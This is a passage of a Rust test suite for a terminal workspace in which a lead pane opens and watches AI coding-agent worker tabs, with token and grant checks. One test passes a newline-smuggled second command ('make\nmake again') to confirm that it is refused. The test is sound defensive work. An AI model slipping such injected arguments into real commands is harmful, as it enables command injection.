                 while [ ! -e '{gate}' ] && [ \"$i\" -lt 300 ]; do sleep 0.1; i=$((i + 1)); done\n",
                reached = reached.display(),
                gate = gate.display(),
            );
            crate::process::write_program(&hook, &script);
            git(
                &repository,
                &["config", "core.hooksPath", &hooks.display().to_string()],
            );

            workspace.set_worktrees_directory(root.0.join("store"));
            let pane = workspace.tabs().focused_pane_id().expect("a pane");
            workspace.update_session(pane, ctx, |session| {
                session.working_directory = Some(repository);
            });
            gated = Some((reached, gate));
        });
        let Some((reached, gate)) = gated else {
            eprintln!("skipped: no git here to make a repository with");
            return;
        };
        let token = served.token(first_pane(&served));

        let socket = served.socket();
        let asking = token.clone();
        let slow = thread::spawn(move || {
            cli::unix::open_tab(
                &socket,
                Some(&asking),
                NewTab {
                    command: vec!["make".to_owned()],
                    worktree: Some("slow".to_owned()),
                    ..NewTab::default()
                },
                true,
            )
            .map_err(|error| error.to_string())
        });
        served.pump_until("git never got to the checkout", |_| reached.exists());

        for _ in 0..spawn::REFUSALS_ALLOWED {
            let refused = served
                .open_tab(Some(token.clone()), new_tab(&["make\nmake again"]))
                .expect_err("a newline in a word is refused");
            assert!(refused.contains("bad-request"), "{refused}");
        }
        let stopped = served
            .open_tab(Some(token.clone()), new_tab(&["make"]))
            .expect_err("the window has stopped answering");
        assert!(stopped.contains("too-many-refusals"), "{stopped}");

        fs::write(&gate, "").expect("the gate opens");
        served.pump_until("the worktree's tab never opened", |_| slow.is_finished());
        slow.join()
            .expect("the asking thread")
            .expect("a tab agreed to before the stop still opens");

        let stopped = served
            .open_tab(Some(token), new_tab(&["make"]))
            .expect_err("the stopped pane was answered again");
        assert!(stopped.contains("too-many-refusals"), "{stopped}");
    }

    #[test]
    fn a_wait_answers_when_the_pane_it_waits_on_stops_for_a_person() {
        let mut served = Served::new(|_, _, _| {});
        let lead = first_pane(&served);
        let token = served.token(lead);
        let opened = served
            .open_tab(Some(token.clone()), new_tab(&["claude"]))
            .expect("the lead opens a worker");
        let worker = served.pane(opened.pane_id);

        // Long, so that an answer at the end of it — where the pane is when
        // the time runs out, which is needs-input by then too — cannot pass
        // for the one the report should have given at once.
        let asking = served.start(wait(&token, worker, Until::NeedsInput, 120, false));
        served.pump_until("the wait was never registered", |served| {
            served.waiting() == 1
        });
        // What the lead's own agent says, and the worker getting to work,
        // answer nothing: it is the worker stopping that is waited for.
        served.report(lead, AgentStatus::NeedsInput, Some("mine"));
        served.report(worker, AgentStatus::Running, None);
        assert_eq!(served.waiting(), 1, "not answered by the wrong report");

        served.report(
            worker,
            AgentStatus::NeedsInput,
            Some("may I run the tests?"),
        );
        assert_eq!(served.waiting(), 0, "answered the moment it was said");
        let printed = served.finish(asking).expect("answered");
        assert_eq!(printed.text, "needs-input: may I run the tests?");
        assert_eq!(printed.failure, None);
    }

    #[test]
    fn a_wait_that_runs_out_answers_with_where_the_pane_is_and_fails() {
        let mut served = Served::new(|_, _, _| {});
        let lead = first_pane(&served);
        let token = served.token(lead);
        let opened = served
            .open_tab(Some(token.clone()), new_tab(&["claude"]))
            .expect("the lead opens a worker");
        let worker = served.pane(opened.pane_id);

        let started = Instant::now();
        let printed = served
            .ask(wait(&token, worker, Until::Idle, 1, true))
            .expect("answered, not refused");
        let took = started.elapsed();
        assert!(
            took >= Duration::from_secs(1),
            "waited its second: {took:?}"
        );
        assert!(
            took < server::DEADLINE,
            "and no longer than its own timeout and a question: {took:?}"
        );

        let waited: Waited = serde_json::from_str(&printed.text).expect("--json is the answer");
        assert!(
            !waited.reached,
            "a worker whose agent has said nothing is idle by default, and that is not the \
             idle it is waited for: {waited:?}"
        );
        assert_eq!(waited.status.as_deref(), Some("idle"));
        assert!(!waited.closed);
        assert_eq!(
            printed.failure.as_deref(),
            Some(
                format!(
                    "pane {} was not idle within 1 seconds; it is idle",
                    opened.pane_id
                )
                .as_str()
            )
        );

        // Once it has said so, a wait of no time says so at once.
        served.report(worker, AgentStatus::Running, None);
        served.report(worker, AgentStatus::Idle, None);
        let printed = served
            .ask(wait(&token, worker, Until::Idle, 0, false))
            .expect("answered");
        assert_eq!((printed.text.as_str(), printed.failure), ("idle", None));
    }

    /// Claude Code with no hooks draws `✳` from the moment it starts. A lead
    /// that asks straight after opening it must not read that as the work
    /// being done — nor, in a pane whose last agent's running was taken back
    /// when it left, the `✳` of the next one.
    #[test]
    fn a_wait_for_idle_is_not_answered_by_the_title_claude_starts_with() {
        let mut served = Served::new(|_, _, _| {});
        let lead = first_pane(&served);
        let token = served.token(lead);
        let opened = served
            .open_tab(Some(token.clone()), new_tab(&["claude"]))
            .expect("the lead opens a worker");
        let worker = served.pane(opened.pane_id);
        let idle_now = |served: &mut Served| {
            let printed = served
                .ask(wait(&token, worker, Until::Idle, 0, false))
                .expect("answered");
            assert_eq!(printed.text, "idle");
            printed.failure.is_none()
        };

        served.titled(worker, "\u{2733} Claude Code");
        assert!(
            !idle_now(&mut served),
            "the title it starts with answered a wait for idle"
        );

        served.titled(worker, "\u{25d0} Fix the flaky test");
        served.update(|workspace, ctx| {
            workspace.apply_terminal_update(&TerminalUpdate::Title(worker, None), ctx);
        });
        assert!(idle_now(&mut served), "the agent that left is not idle");
        served.titled(worker, "\u{2733} Claude Code");
        assert!(
            !idle_now(&mut served),
            "the next agent's startup title answered a wait for idle"
        );
    }

    /// The title is the only word a worker with no hooks says, and a wait
    /// registered before it says it hears it as it comes, rather than when
    /// the wait runs out.
    #[test]
    fn a_wait_for_idle_hears_the_title_say_the_turn_is_over() {
        let mut served = Served::new(|_, _, _| {});
        let lead = first_pane(&served);
        let token = served.token(lead);
        let opened = served
            .open_tab(Some(token.clone()), new_tab(&["claude"]))
            .expect("the lead opens a worker");
        let worker = served.pane(opened.pane_id);

        // Long, so that the answer the time running out gives — idle by
        // then too — cannot pass for the one the title should give at once.
        let asking = served.start(wait(&token, worker, Until::Idle, 120, false));
        served.pump_until("the wait was never registered", |served| {
            served.waiting() == 1
        });
        served.titled(worker, "\u{2733} Claude Code");
        served.titled(worker, "\u{25d0} Fix the flaky test");
        served.titled(worker, "\u{25d1} Fix the flaky test");
        assert_eq!(served.waiting(), 1, "answered before the turn was over");

        served.titled(worker, "\u{2733} Fix the flaky test");
        assert_eq!(served.waiting(), 0, "not answered when the title said so");
        let printed = served.finish(asking).expect("answered");
        assert_eq!((printed.text.as_str(), printed.failure), ("idle", None));
    }

    /// A status the title says is a status like any other on the stream, and
    /// so is the idle the end of its command takes it back to.
    #[test]
    fn a_stream_carries_what_the_title_says_and_the_end_that_takes_it_back() {
        let mut served = Served::new(|_, _, _| {});
        let lead = first_pane(&served);
        let token = served.token(lead);
        let opened = served
            .open_tab(Some(token.clone()), new_tab(&["claude"]))
            .expect("the lead opens a worker");
        let worker = served.pane(opened.pane_id);

        let following = served.start(follow(Some(&token), Some(worker)));
        served.pump_until("the stream never started", |served| served.following() == 1);
        served.titled(worker, "\u{2733} Claude Code");
        served.titled(worker, "\u{25d0} Fix the flaky test");
        served.titled(worker, "\u{25d1} Fix the flaky test");
        served.titled(worker, "\u{2733} Fix the flaky test");
        served.titled(worker, "\u{25d2} Fix the flaky test");
        // Killed mid-turn, in the order the model hands it over: what the
        // pane runs, read off the snapshot, and then the shell's end.
        served.update(|workspace, ctx| {
            workspace.apply_terminal_update(&TerminalUpdate::Running(worker, None), ctx);
            workspace.apply_terminal_update(
                &TerminalUpdate::CommandFinished {
                    pane: worker,
                    command: Some("claude".to_owned()),
                    exit: Some(137),
                    took: None,
                    ran: true,
                },
                ctx,
            );
            workspace.apply(TabAction::ClosePane(worker), ctx);
        });

        let events = served.finish(following).expect("followed until it closed");
        let pane_id = opened.pane_id;
        let status = |status: &str| PaneEvent::Status {
            pane_id,
            status: status.to_owned(),
            message: None,
        };
        assert_eq!(
            events,
            vec![
                status("running"),
                status("idle"),
                status("running"),
                status("idle"),
                PaneEvent::Finished {
                    pane_id,
                    command: Some("claude".to_owned()),
                    exit: Some(137),
                    duration_ms: None,
                },
                PaneEvent::Closed { pane_id },
            ]
        );
    }

    /// With the hooks, the `✳` Claude Code goes back to after Esc takes
    /// their running back on the row, but it is no report that the turn is
    /// over: the same `✳` comes as a permission dialog opens, ahead of the
    /// notification that asks. So a wait for idle is answered by the hooks'
    /// idle and not by it, and a stream is told the running once, however
    /// often the title takes it back and puts it back.
    #[test]
    fn the_star_over_a_hooks_running_answers_no_wait_and_tells_no_stream() {
        let mut served = Served::new(|_, _, _| {});
        let lead = first_pane(&served);
        let token = served.token(lead);
        let opened = served
            .open_tab(Some(token.clone()), new_tab(&["claude"]))
            .expect("the lead opens a worker");
        let worker = served.pane(opened.pane_id);

        let following = served.start(follow(Some(&token), Some(worker)));
        served.pump_until("the stream never started", |served| served.following() == 1);
        let asking = served.start(wait(&token, worker, Until::Idle, 120, false));
        served.pump_until("the wait was never registered", |served| {
            served.waiting() == 1
        });

        served.report(worker, AgentStatus::Running, None);
        served.titled(worker, "\u{2733} Fix the flaky test");
        assert_eq!(
            served.session(worker, |session| session.status),
            AgentStatus::Idle,
            "the star did not take the running back"
        );
        assert_eq!(served.waiting(), 1, "the star answered a wait for idle");
        served.titled(worker, "\u{25d0} Fix the flaky test");
        served.titled(worker, "\u{2733} Fix the flaky test");
        assert_eq!(served.waiting(), 1, "the second star answered it");

        served.report(worker, AgentStatus::Idle, None);
        assert_eq!(served.waiting(), 0, "the hooks' idle did not answer it");
        let printed = served.finish(asking).expect("answered");
        assert_eq!((printed.text.as_str(), printed.failure), ("idle", None));

        served.update(|workspace, ctx| {
            workspace.apply(TabAction::ClosePane(worker), ctx);
        });
        let events = served.finish(following).expect("followed until it closed");
        let pane_id = opened.pane_id;
        let status = |status: &str| PaneEvent::Status {
            pane_id,
            status: status.to_owned(),
            message: None,
        };
        assert_eq!(
            events,
            vec![
                status("running"),
                status("idle"),
                PaneEvent::Closed { pane_id },
            ]
        );
    }

    /// A worker whose turn an API error ended is told a minute later, by
    /// Claude Code's idle reminder, that it is waiting for input. That is no
    /// question: a lead waiting for one is not answered by it, a stream is
    /// not told it, and a lead waiting for the turn to end still hears what
    /// went wrong when the time runs out.
    #[test]
    fn the_reminder_after_a_failure_answers_no_wait_and_tells_no_stream() {
        let mut served = Served::new(|_, _, _| {});
        let lead = first_pane(&served);
        let token = served.token(lead);
        let opened = served
            .open_tab(Some(token.clone()), new_tab(&["claude"]))
            .expect("the lead opens a worker");
        let worker = served.pane(opened.pane_id);

        let following = served.start(follow(Some(&token), Some(worker)));
        served.pump_until("the stream never started", |served| served.following() == 1);
        let asking = served.start(wait(&token, worker, Until::NeedsInput, 120, false));
        served.pump_until("the wait was never registered", |served| {
            served.waiting() == 1
        });

        served.report(worker, AgentStatus::Running, None);
        served.report(
            worker,
            AgentStatus::Failed,
            Some("You've hit your limit · resets 5pm"),
        );
        served.report(
            worker,
            AgentStatus::NeedsInput,
            Some("Claude is waiting for your input"),
        );
        assert_eq!(served.waiting(), 1, "the reminder answered a wait");
        let printed = served
            .ask(wait(&token, worker, Until::Idle, 1, false))
            .expect("answered, not refused");
        assert_eq!(
            (printed.text.as_str(), printed.failure.is_some()),
            ("failed: You've hit your limit · resets 5pm", true)
        );

        served.report(worker, AgentStatus::Running, None);
        served.report(
            worker,
            AgentStatus::NeedsInput,
            Some("Claude needs your permission to use Bash"),
        );
        assert_eq!(served.waiting(), 0, "the question after it went unheard");
        let printed = served.finish(asking).expect("answered");
        assert_eq!(
            printed.text,
            "needs-input: Claude needs your permission to use Bash"
        );

        served.update(|workspace, ctx| {
            workspace.apply(TabAction::ClosePane(worker), ctx);
        });
        let events = served.finish(following).expect("followed until it closed");
        let pane_id = opened.pane_id;
        let status = |status: &str, message: Option<&str>| PaneEvent::Status {
            pane_id,
            status: status.to_owned(),
            message: message.map(str::to_owned),
        };
        assert_eq!(
            events,
            vec![
                status("running", None),
                status("failed", Some("You've hit your limit · resets 5pm")),
                status("running", None),
                status(
                    "needs-input",
                    Some("Claude needs your permission to use Bash")
                ),
                PaneEvent::Closed { pane_id },
            ]
        );
    }

    /// Codex and Gemini CLI say in their titles when they stop for an
    /// approval, which Claude Code's never does, so a worker of theirs with
    /// no hooks is heard asking as it asks, rather than when the wait runs
    /// out.
    #[test]
    fn a_wait_for_needs_input_hears_the_title_ask() {
        let mut served = Served::new(|_, _, _| {});
        let lead = first_pane(&served);
        let token = served.token(lead);
        let opened = served
            .open_tab(Some(token.clone()), new_tab(&["codex"]))
            .expect("the lead opens a worker");
        let worker = served.pane(opened.pane_id);

        // Long, so that the answer the time running out gives cannot pass
        // for the one the title should give at once.
        let asking = served.start(wait(&token, worker, Until::NeedsInput, 120, false));
        served.pump_until("the wait was never registered", |served| {
            served.waiting() == 1
        });
        served.titled(worker, "proj");
        assert_eq!(served.waiting(), 1, "answered before anything asked");

        served.titled(worker, "[ ! ] Action Required | proj");
        assert_eq!(served.waiting(), 0, "not answered when the title asked");
        let printed = served.finish(asking).expect("answered");
        assert_eq!(
            (printed.text.as_str(), printed.failure),
            ("needs-input", None)
        );
    }

    /// A codex worker `tab new` opened runs the line it typed, every word
    /// quoted, and is a pane running codex all the same: its spinner is its
    /// work, so the approval it stops for is not the end of its turn, and
    /// only the folder it shows once the spinner stops answers a wait for
    /// idle.
    #[test]
    fn a_wait_for_idle_on_a_codex_tab_new_opened_waits_out_its_approvals() {
        let mut served = Served::new(|_, _, _| {});
        let lead = first_pane(&served);
        let token = served.token(lead);
        let words = ["codex", "fix the flaky test"];
        let opened = served
            .open_tab(Some(token.clone()), new_tab(&words))
            .expect("the lead opens a worker");
        let worker = served.pane(opened.pane_id);
        let owned = words.map(str::to_owned);
        let line = spawn::command_line(&owned, Path::new("zsh")).expect("a proven shell");
        served.update(|workspace, ctx| {
            workspace.apply_terminal_update(&TerminalUpdate::Running(worker, Some(line)), ctx);
        });
        served.titled(worker, "proj");

        let waiting = served.start(wait(&token, worker, Until::Idle, 120, false));
        served.pump_until("the wait was never registered", |served| {
            served.waiting() == 1
        });
        for title in [
            "\u{280b} proj",
            "\u{2819} proj",
            "[ ! ] Action Required | proj",
            "[ . ] Action Required | proj",
            "\u{2839} proj",
        ] {
            served.titled(worker, title);
            assert_eq!(served.waiting(), 1, "answered at {title:?}, mid-turn");
        }
        served.titled(worker, "proj");
        assert_eq!(served.waiting(), 0, "not answered when the spinner stopped");
        let printed = served.finish(waiting).expect("answered");
        assert_eq!((printed.text.as_str(), printed.failure), ("idle", None));
    }

    /// A title that stops asking and says no more ends the question and not
    /// the turn: codex in a pipeline works on after an approval, and its
    /// spinner is any build tool's there. A wait for idle goes on, and the
    /// stream is told the question and not an idle.
    #[test]
    fn a_title_that_stops_asking_tells_no_wait_or_stream_the_turn_is_over() {
        let mut served = Served::new(|_, _, _| {});
        let lead = first_pane(&served);
        let token = served.token(lead);
        let words = ["sh", "-c", "codex 'fix x' | tee codex.log"];
        let opened = served
            .open_tab(Some(token.clone()), new_tab(&words))
            .expect("the lead opens a worker");
        let worker = served.pane(opened.pane_id);
        let owned = words.map(str::to_owned);
        let line = spawn::command_line(&owned, Path::new("zsh")).expect("a proven shell");
        served.update(|workspace, ctx| {
            workspace.apply_terminal_update(&TerminalUpdate::Running(worker, Some(line)), ctx);
        });

        let following = served.start(follow(Some(&token), Some(worker)));
        served.pump_until("the stream never started", |served| served.following() == 1);
        let waiting = served.start(wait(&token, worker, Until::Idle, 120, false));
        served.pump_until("the wait was never registered", |served| {
            served.waiting() == 1
        });
        served.titled(worker, "[ ! ] Action Required | proj");
        served.titled(worker, "\u{280b} proj");
        served.titled(worker, "\u{2819} proj");
        assert_eq!(
            served.session(worker, |session| session.status),
            AgentStatus::Idle,
            "the question was never ended"
        );
        assert_eq!(
            served.waiting(),
            1,
            "answered when the title stopped asking"
        );

        served.update(|workspace, ctx| {
            workspace.apply(TabAction::ClosePane(worker), ctx);
        });
        let printed = served.finish(waiting).expect("answered");
        assert_ne!(printed.text, "idle");
        assert!(printed.failure.is_some(), "{}", printed.text);
        let events = served.finish(following).expect("followed until it closed");
        let pane_id = opened.pane_id;
        assert_eq!(
            events,
            vec![
                PaneEvent::Status {
                    pane_id,
                    status: "needs-input".to_owned(),
                    message: None,
                },
                PaneEvent::Closed { pane_id },
            ]
        );
    }

    /// The end of its command ends the turn a title stopped asking in,
    /// though the title could not say so: the agent that might have been at
    /// work on the approval has gone. A wait for idle is answered then, and
    /// the stream is told `idle` before `finished`, as it is for an agent
    /// killed while it asks. Codex that `tab new` opened, whose folder comes
    /// back when the person declines, and codex through `sh -c`, whose
    /// spinner is any build tool's.
    #[test]
    fn the_end_of_its_command_ends_the_turn_a_title_stopped_asking_in() {
        // What the worker runs, the titles it shows, and what the stream
        // says of them before the end of the command.
        let codex: (&[&str], &[&str], &[&str]) = (
            &["codex", "fix x"],
            &[
                "proj",
                "\u{280b} proj",
                "[ ! ] Action Required | proj",
                "proj",
            ],
            &["running", "needs-input"],
        );
        let npx: (&[&str], &[&str], &[&str]) = (
            &["sh", "-c", "npx @openai/codex 'fix x'"],
            &[
                "[ ! ] Action Required | proj",
                "\u{280b} proj",
                "\u{2819} proj",
            ],
            &["needs-input"],
        );
        for (words, titles, said) in [codex, npx] {
            let mut served = Served::new(|_, _, _| {});
            let lead = first_pane(&served);
            let token = served.token(lead);
            let opened = served
                .open_tab(Some(token.clone()), new_tab(words))
                .expect("the lead opens a worker");
            let worker = served.pane(opened.pane_id);
            let owned: Vec<String> = words.iter().map(|word| (*word).to_owned()).collect();
            let line = spawn::command_line(&owned, Path::new("zsh")).expect("a proven shell");
            served.update(|workspace, ctx| {
                workspace.apply_terminal_update(
                    &TerminalUpdate::Running(worker, Some(line.clone())),
                    ctx,
                );
            });

            let following = served.start(follow(Some(&token), Some(worker)));
            served.pump_until("the stream never started", |served| served.following() == 1);
            let waiting = served.start(wait(&token, worker, Until::Idle, 120, false));
            served.pump_until("the wait was never registered", |served| {
                served.waiting() == 1
            });
            for title in titles {
                served.titled(worker, title);
            }
            assert!(
                served.session(worker, |session| {
                    matches!(session.source, StatusSource::TitleStoppedAsking(_))
                }),
                "{words:?}: the title never stopped asking"
            );
            assert_eq!(
                served.waiting(),
                1,
                "{words:?}: answered when the title stopped asking"
            );

            // The person quits the agent, in the order the model hands it
            // over: what the pane runs, read off the snapshot, then the end.
            served.update(|workspace, ctx| {
                workspace.apply_terminal_update(&TerminalUpdate::Running(worker, None), ctx);
                workspace.apply_terminal_update(
                    &TerminalUpdate::CommandFinished {
                        pane: worker,
                        command: Some(line.clone()),
                        exit: Some(0),
                        took: None,
                        ran: true,
                    },
                    ctx,
                );
            });
            assert_eq!(
                served.waiting(),
                0,
                "{words:?}: not answered when the command ended"
            );
            let printed = served.finish(waiting).expect("answered");
            assert_eq!(
                (printed.text.as_str(), printed.failure),
                ("idle", None),
                "{words:?}"
            );

            served.update(|workspace, ctx| {
                workspace.apply(TabAction::ClosePane(worker), ctx);
            });
            let events = served.finish(following).expect("followed until it closed");
            let pane_id = opened.pane_id;
            let status = |status: &str| PaneEvent::Status {
                pane_id,
                status: status.to_owned(),
                message: None,
            };
            let mut expected: Vec<PaneEvent> = said.iter().map(|said| status(said)).collect();
            expected.extend([
                status("idle"),
                PaneEvent::Finished {
                    pane_id,
                    command: Some(line),
                    exit: Some(0),
                    duration_ms: None,
                },
                PaneEvent::Closed { pane_id },
            ]);
            assert_eq!(events, expected, "{words:?}");
        }
    }

    /// The question a title asks is on the stream with the rest of what it
    /// says, and so is the idle the end of its command takes it back to
    /// when the agent is killed asking it.
    #[test]
    fn a_stream_carries_the_question_a_title_asks_and_the_end_that_takes_it_back() {
        let mut served = Served::new(|_, _, _| {});
        let lead = first_pane(&served);
        let token = served.token(lead);
        let opened = served
            .open_tab(Some(token.clone()), new_tab(&["gemini"]))
            .expect("the lead opens a worker");
        let worker = served.pane(opened.pane_id);
        // As Gemini CLI writes them, padded to 80 columns.
        let gemini = |title: &str| format!("{title:<80}");

        let following = served.start(follow(Some(&token), Some(worker)));
        served.pump_until("the stream never started", |served| served.following() == 1);
        served.titled(worker, &gemini("\u{25c7}  Ready (proj)"));
        served.titled(worker, &gemini("\u{2726}  Working\u{2026} (proj)"));
        served.titled(worker, &gemini("\u{270b}  Action Required (proj)"));
        served.titled(worker, &gemini("\u{2726}  Working\u{2026} (proj)"));
        served.titled(worker, &gemini("\u{270b}  Action Required (proj)"));
        // Killed while it asks, in the order the model hands it over: what
        // the pane runs, read off the snapshot, and then the shell's end.
        served.update(|workspace, ctx| {
            workspace.apply_terminal_update(&TerminalUpdate::Running(worker, None), ctx);
            workspace.apply_terminal_update(
                &TerminalUpdate::CommandFinished {
                    pane: worker,
                    command: Some("gemini".to_owned()),
                    exit: Some(137),
                    took: None,
                    ran: true,
                },
                ctx,
            );
            workspace.apply(TabAction::ClosePane(worker), ctx);
        });

        let events = served.finish(following).expect("followed until it closed");
        let pane_id = opened.pane_id;
        let status = |status: &str| PaneEvent::Status {
            pane_id,
            status: status.to_owned(),
            message: None,
        };
        assert_eq!(
            events,
            vec![
                status("running"),
                status("needs-input"),
                status("running"),
                status("needs-input"),
                status("idle"),
                PaneEvent::Finished {
                    pane_id,
                    command: Some("gemini".to_owned()),
                    exit: Some(137),
                    duration_ms: None,
                },
                PaneEvent::Closed { pane_id },
            ]
        );
    }

    #[test]
    fn a_pane_watches_itself_without_anybodys_grant() {
        let mut served = Served::new(|_, _, _| {});
        let lead = first_pane(&served);
        let token = served.token(lead);

        let printed = served
            .ask(wait(&token, lead, Until::NeedsInput, 0, false))
            .expect("its own pane is its own to watch");
        assert_eq!(printed.text, "idle");
        assert!(
            printed.failure.is_some(),
            "and it is not waiting for anybody"
        );

        served.report(lead, AgentStatus::NeedsInput, Some("which branch?"));
        let printed = served
            .ask(wait(&token, lead, Until::NeedsInput, 0, false))
            .expect("answered");
        assert_eq!(printed.text, "needs-input: which branch?");
        assert_eq!(printed.failure, None);
    }

    #[test]
    fn watching_a_pane_a_person_opened_needs_a_grant_and_without_a_token_nothing_may_be_watched() {
        let mut served = Served::new(|workspace, ctx, _| {
            workspace.apply(TabAction::New, ctx);
        });
        let (lead, person) = served.read(|workspace, _| {
            let mut panes = workspace.tabs().panes().map(|(_, pane)| pane.id());
            (panes.next().expect("a pane"), panes.next().expect("two"))
        });
        let token = served.token(lead);

        let refusals = [
            served
                .ask(wait(&token, person, Until::Idle, 0, false))
                .map(|_| ()),
            served
                .ask(wait(&token, person, Until::Idle, 5, false))
                .map(|_| ()),
            served.ask(read_blocks(&token, person, None)).map(|_| ()),
            served.ask(follow(Some(&token), Some(person))).map(|_| ()),
        ];
        for refused in refusals {
            let refused = refused.expect_err("a person's pane is theirs to open up");
            assert!(refused.contains("needs-grant"), "{refused}");
            assert!(refused.contains("grant from the person"), "{refused}");
        }

        let strangers = [
            served
                .ask(move |socket| {
                    cli::unix::wait(
                        &socket,
                        None,
                        Wait {
                            pane: lead.as_u64(),
                            until: Until::Idle,
                            timeout: Some(0),
                        },
                        false,
                    )
                    .map(|_| ())
                    .map_err(|error| error.to_string())
                })
                .expect_err("no token"),
            served.ask(follow(None, None)).expect_err("no token"),
            served
                .ask(wait("0", lead, Until::Idle, 0, false))
                .expect_err("a token no pane holds"),
        ];
        for refused in strangers {
            assert!(refused.contains("unauthorized"), "{refused}");
            assert!(refused.contains("CROOK_TOKEN"), "{refused}");
        }

        let nobody = served
            .ask(move |socket| {
                cli::unix::read_blocks(
                    &socket,
                    Some(&token),
                    ReadBlocks {
                        pane: 999_999,
                        last: None,
                    },
                    false,
                    None,
                )
                .map_err(|error| error.to_string())
            })
            .expect_err("no such pane");
        assert!(nobody.contains("no-such-pane"), "{nobody}");
        assert_eq!(served.waiting() + served.following(), 0);
    }

    #[test]
    fn a_stream_carries_a_status_a_command_and_its_end_in_order_and_ends_when_its_pane_closes() {
        let mut served = Served::new(|_, _, _| {});
        let lead = first_pane(&served);
        let token = served.token(lead);
        let opened = served
            .open_tab(Some(token.clone()), new_tab(&["make", "test"]))
            .expect("the lead opens a worker");
        let worker = served.pane(opened.pane_id);

        let following = served.start(follow(Some(&token), Some(worker)));
        served.pump_until("the stream never started", |served| served.following() == 1);
        served.report(worker, AgentStatus::NeedsInput, Some("may I?"));
        // Said again, the same: a status that did not change is no event.
        served.report(worker, AgentStatus::NeedsInput, Some("may I?"));
        // Another pane's: not the one followed.
        served.report(lead, AgentStatus::Running, None);
        served.update(|workspace, ctx| {
            workspace.apply_terminal_update(
                &TerminalUpdate::Running(worker, Some("make test".to_owned())),
                ctx,
            );
            workspace.apply_terminal_update(
                &TerminalUpdate::CommandFinished {
                    pane: worker,
                    command: Some("make test".to_owned()),
                    exit: Some(2),
                    took: Some(Duration::from_millis(1500)),
                    ran: true,
                },
                ctx,
            );
            workspace.apply(TabAction::ClosePane(worker), ctx);
        });

        let events = served.finish(following).expect("followed until it closed");
        let pane_id = opened.pane_id;
        assert_eq!(
            events,
            vec![
                PaneEvent::Status {
                    pane_id,
                    status: "needs-input".to_owned(),
                    message: Some("may I?".to_owned()),
                },
                PaneEvent::Started {
                    pane_id,
                    command: "make test".to_owned(),
                },
                PaneEvent::Finished {
                    pane_id,
                    command: Some("make test".to_owned()),
                    exit: Some(2),
                    duration_ms: Some(1500),
                },
                PaneEvent::Closed { pane_id },
            ]
        );
        assert_eq!(served.following(), 0, "and let go of when it ended");
    }

    #[test]
    fn a_stream_of_a_panes_own_hears_of_the_tabs_it_opens_and_of_nobody_elses() {
        let mut served = Served::new(|workspace, ctx, _| {
            workspace.apply(TabAction::New, ctx);
        });
        let (lead, person) = served.read(|workspace, _| {
            let mut panes = workspace.tabs().panes().map(|(_, pane)| pane.id());
            (panes.next().expect("a pane"), panes.next().expect("two"))
        });
        let token = served.token(lead);

        let following = served.start(follow(Some(&token), None));
        served.pump_until("the stream never started", |served| served.following() == 1);
        served.report(person, AgentStatus::NeedsInput, Some("not yours"));
        let opened = served
            .open_tab(Some(token.clone()), new_tab(&["claude"]))
            .expect("the lead opens a worker");
        let worker = served.pane(opened.pane_id);
        served.report(worker, AgentStatus::Running, None);
        served.report(lead, AgentStatus::Failed, None);
        served.update(|workspace, ctx| {
            workspace.apply(TabAction::ClosePane(lead), ctx);
        });

        let events = served
            .finish(following)
            .expect("followed until the lead closed");
        assert_eq!(
            events,
            vec![
                PaneEvent::Opened {
                    pane_id: opened.pane_id,
                },
                PaneEvent::Status {
                    pane_id: opened.pane_id,
                    status: "running".to_owned(),
                    message: None,
                },
                PaneEvent::Status {
                    pane_id: lead.as_u64(),
                    status: "failed".to_owned(),
                    message: None,
                },
                PaneEvent::Closed {
                    pane_id: lead.as_u64(),
                },
            ],
            "the worker outlives its lead and is not said to have closed"
        );
    }

    #[test]
    fn a_reader_that_falls_behind_is_told_it_lagged_and_the_window_holds_no_more_than_the_buffer() {
        let (handed, feed) = std::sync::mpsc::channel::<Arc<Feed>>();
        let answer: Answer = Arc::new(move |_, feed: Option<Arc<Feed>>, _| {
            if let Some(feed) = feed {
                let _ = handed.send(feed);
            }
            Ok(json!({ "panes": [7] }))
        });
        let (mut client, answering) = conversation(answer, Duration::from_secs(5));
        client.send(&protocol::request_line(
            &Verb::EventsFollow(Follow::default()),
            Some("c0ffee"),
        ));
        assert!(client.reply().expect("the first answer").ok);
        let feed = feed
            .recv_timeout(Duration::from_secs(10))
            .expect("the window was handed a feed");

        // Far more than the socket's buffer and the feed's together, pushed
        // while the client reads nothing.
        let pushed = 20_000u64;
        for number in 0..pushed {
            feed.push(
                serde_json::to_value(PaneEvent::Status {
                    pane_id: 7,
                    status: "running".to_owned(),
                    message: Some(number.to_string()),
                })
                .expect("encodes"),
            );
            assert!(feed.held() <= watch::FOLLOW_BUFFER);
        }
        feed.end();

        let mut events = Vec::new();
        loop {
            let mut line = String::new();
            match client.replies.read_line(&mut line) {
                Ok(0) => break,
                Ok(_) => {
                    events.push(serde_json::from_str::<PaneEvent>(&line).expect("an event a line"))
                }
                Err(error) => panic!("the stream broke: {error}"),
            }
        }
        answering.join().expect("the connection's thread");

        let dropped: u64 = events
            .iter()
            .map(|event| match event {
                PaneEvent::Lagged { dropped } => *dropped,
                _ => 0,
            })
            .sum();
        let written = events
            .iter()
            .filter(|event| matches!(event, PaneEvent::Status { .. }))
            .count() as u64;
        assert!(dropped > 0, "a reader this far behind is told it lagged");
        assert_eq!(
            written + dropped,
            pushed,
            "every event was written or counted as dropped"
        );
        assert_eq!(
            events.last(),
            Some(&PaneEvent::Status {
                pane_id: 7,
                status: "running".to_owned(),
                message: Some((pushed - 1).to_string()),
            }),
            "the newest are the ones kept"
        );
    }

    #[test]
    fn waits_take_no_place_a_question_needs_and_are_bounded_and_let_go_when_the_client_hangs_up() {
        let lanes = Arc::new(Lanes::default());
        let (asked, registered) = std::sync::mpsc::channel();
        // A window that registers every wait and never answers one.
        let answer: Answer = Arc::new(move |_, feed: Option<Arc<Feed>>, _| {
            if feed.is_some() {
                let _ = asked.send(());
            }
            Ok(Value::Null)
        });
        let waiting = protocol::request_line(
            &Verb::PaneWait(Wait {
                pane: 7,
                until: Until::Idle,
                timeout: Some(60),
            }),
            Some("c0ffee"),
        );
        let mut kept = Vec::new();
        for _ in 0..server::MAX_KEPT {
            let (mut client, answering) =
                conversation_in(&lanes, answer.clone(), Duration::from_secs(5));
            client.send(&waiting);
            registered
                .recv_timeout(Duration::from_secs(10))
                .expect("the wait reached the window");
            kept.push((client, answering));
        }

        // Every place a question is answered in is still free.
        let places: Vec<Place> = (0..server::MAX_CONNECTIONS)
            .map(|_| Place::take(&lanes).expect("a question's place is free"))
            .collect();
        assert!(Place::take(&lanes).is_none(), "and no more than those");
        drop(places);

        let (mut client, answering) =
